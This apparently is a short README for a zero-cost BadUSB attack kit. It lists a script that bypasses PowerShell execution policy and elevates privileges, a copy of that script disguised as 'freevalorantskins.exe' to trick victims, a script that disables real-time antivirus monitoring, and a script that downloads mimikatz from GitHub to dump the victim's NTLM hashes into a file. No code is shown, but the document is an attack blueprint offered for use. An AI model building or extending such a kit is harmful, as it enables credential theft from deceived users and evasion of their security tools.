# BadUSB
# creating a badUSB attack using zero dollars 

badusb attack using mimikatz software

safe.ps1: script to bypass execution policy and start our payload in the secret folder with administrative rights 

freevalorantskins.exe: safe.ps1 converted into an executable using PS2win 

/secret/runme.ps1: to disable real time monitoring 

/secret/mimi.ps1: downloads mimikatz.exe(can be changed to desired payload url link) from github and executes the commands needed to get the NTLM hashes of the victim's device. After which the mimikatz terminal output will be saved in an output file called "mimikatz_output.txt" in the 'secret' folder
